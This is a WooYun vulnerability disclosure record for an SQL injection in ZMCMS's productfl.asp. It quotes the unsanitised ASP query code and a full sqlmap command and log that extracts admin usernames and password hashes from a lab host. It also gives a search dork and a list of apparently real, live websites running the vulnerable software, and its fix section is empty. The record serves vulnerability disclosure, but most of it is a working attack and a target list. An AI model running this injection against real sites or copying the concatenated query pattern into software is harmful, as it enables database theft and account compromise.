{"id": 50234, "wybug_id": "wooyun-2014-078451", "wybug_title": "通用型企业建站程序之追梦CMS注入3", "wybug_corp": "追梦CMS", "wybug_author": "ra0mb1er", "wybug_date": "2014-10-13 15:01", "wybug_open_date": "2015-01-11 15:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 啪啪啪 详细说明：  漏洞文件productfl.asp 1-20\n<% pone=request.QueryString(\"pone\")ptwo=request.QueryString(\"ptwo\")pthree=request.QueryString(\"pthree\")if pone=\"\"  thenzmcmsTitle=\"所有产品\"end ifif pone<>\"\" thenset lm=server.createobject(\"adodb.recordset\") exec=\"select * from [cpclass] where id=\"&pone&\"\"lm.open exec,conn,1,1zmcmsTitle=lm(\"ClassName\")lm.closeset lm=nothingend ifif ptwo<>\"\" thenset lm=server.createobject(\"adodb.recordset\") exec=\"select * from [cpclass] where id=\"&ptwo&\"\"lm.open exec,conn,1,1zmcmsTitlew=\"&nbsp;>>&nbsp;\"&lm(\"ClassName\")\nproduct.asp 对productfl.asp 文件进行了调用   漏洞证明：  J:\\sqlmap>python sqlmap.py -u \"http://192.168.56.130:8081/product.asp?pone=38&ptwo=1\" --dump -C username,password -T admin         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20140918}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:48:27[13:48:27] [INFO] testing connection to the target URL[13:48:27] [INFO] testing if the target URL is stable. This can take a couple of seconds[13:48:28] [INFO] target URL is stable[13:48:28] [INFO] testing if GET parameter 'pone' is dynamic[13:48:28] [WARNING] GET parameter 'pone' does not appear dynamic[13:48:29] [WARNING] heuristic (basic) test shows that GET parameter 'pone' might not be injectable[13:48:29] [INFO] testing for SQL injection on GET parameter 'pone'[13:48:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[13:48:29] [WARNING] reflective value(s) found and filtering out[13:48:29] [INFO] GET parameter 'pone' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"\\u7f8e\\u5bb9\\u4ea7\\u54c1-\\u4e34\\u6c7e\\u7f51\\u7ad9\\u5efa\\u8bbe---\\u8ffd\\u68a6\\u5de5\\u4f5c\\u5ba4,\\u8ffd\\u68a6\\u4f01\\u4e1a\\u7f51\\u7ad9\\u7ba1\\u7406\\u7cfb\\u7edf\\uff0casp\\u4f01\\u4e1a\\u7f51\\u7ad9\\u7ba1\\u7406\\u7cfb\\u7edf\\uff0c\\u901a\\u7528\\u4f01\\u4e1a\\u7f51\\u7ad9\\u7ba1\\u7406\\u7cfb\\u7edf\\uff0c\\u4f01\\u4e1a\\u5efa\\u7ad9\\u7684\\u9996\\u9009\\u54c1\\u724c\\uff01-http://www.zmcms.net\")[13:48:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[13:48:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[13:48:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[13:48:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[13:48:30] [INFO] testing 'MySQL inline queries'[13:48:30] [INFO] testing 'PostgreSQL inline queries'[13:48:30] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[13:48:30] [INFO] testing 'Oracle inline queries'[13:48:31] [INFO] testing 'SQLite inline queries'[13:48:31] [INFO] testing 'MySQL > 5.0.11 stacked queries'[13:48:31] [WARNING] time-based comparison requires larger statistical model, please wait.....[13:48:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[13:48:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[13:48:31] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[13:48:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[13:48:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[13:48:31] [INFO] testing 'Oracle AND time-based blind'[13:48:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[13:48:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[13:48:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[13:48:33] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[13:48:35] [INFO] checking if the injection point on GET parameter 'pone' is a false positiveGET parameter 'pone' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 83 HTTP(s) requests:---Place: GETParameter: pone    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: pone=38 AND 2790=2790&ptwo=1---[13:48:38] [INFO] testing MySQL[13:48:38] [WARNING] the back-end DBMS is not MySQL[13:48:38] [INFO] testing Oracle[13:48:38] [WARNING] the back-end DBMS is not Oracle[13:48:38] [INFO] testing PostgreSQL[13:48:38] [WARNING] the back-end DBMS is not PostgreSQL[13:48:38] [INFO] testing Microsoft SQL Server[13:48:38] [WARNING] the back-end DBMS is not Microsoft SQL Server[13:48:38] [INFO] testing SQLite[13:48:38] [WARNING] the back-end DBMS is not SQLite[13:48:38] [INFO] testing Microsoft Access[13:48:38] [INFO] confirming Microsoft Access[13:48:38] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[13:48:38] [ERROR] cannot retrieve column names, back-end DBMS is Access[13:48:38] [INFO] fetching entries of column(s) 'password, username' for table 'admin' in database 'Microsoft_Access_masterdb'[13:48:38] [INFO] fetching number of column(s) 'password, username' entries fortable 'admin' in database 'Microsoft_Access_masterdb'[13:48:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[13:48:38] [INFO] retrieved: 2[13:48:39] [INFO] fetching number of distinct values for column 'password'[13:48:39] [INFO] retrieved: 1[13:48:40] [INFO] fetching number of distinct values for column 'username'[13:48:40] [INFO] retrieved: 2[13:48:40] [INFO] using column 'username' as a pivot for retrieving row data[13:48:40] [INFO] retrieved: admin[13:48:44] [INFO] retrieved: 469e80d32c0559f8[13:48:53] [INFO] retrieved: zmcms[13:48:56] [INFO] retrieved: 469e80d32c0559f8[13:49:06] [INFO] analyzing table dump for possible password hashes[13:49:06] [INFO] recognized possible password hashes in column 'password'do you want to store hashes to a temporary file for eventual further processingwith other tools [y/N] ndo you want to crack them via a dictionary-based attack? [Y/n/q] nDatabase: Microsoft_Access_masterdbTable: admin[2 entries]+----------+------------------+| username | password         |+----------+------------------+| admin    | 469e80d32c0559f8 || zmcms    | 469e80d32c0559f8 |+----------+------------------+[13:51:06] [INFO] table 'Microsoft_Access_masterdb.admin' dumped to CSV file 'C:\\Users\\c\\.sqlmap\\output\\192.168.56.130\\dump\\Microsoft_Access_masterdb\\admin.csv'[13:51:06] [INFO] fetched data logged to text files under 'C:\\Users\\c\\.sqlmap\\output\\192.168.56.130'[*] shutting down at 13:51:06J:\\sqlmap>\n\n示例网站 inurl:\"al.asp?pone\"http://www.ahgzc.com/http://www.qqlqq.com/http://www.it8088.com/http://www.whhnt.comhttp://www.hyzlch.com/   修复方案：     版权声明：转载请注明来源 ra0mb1er@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}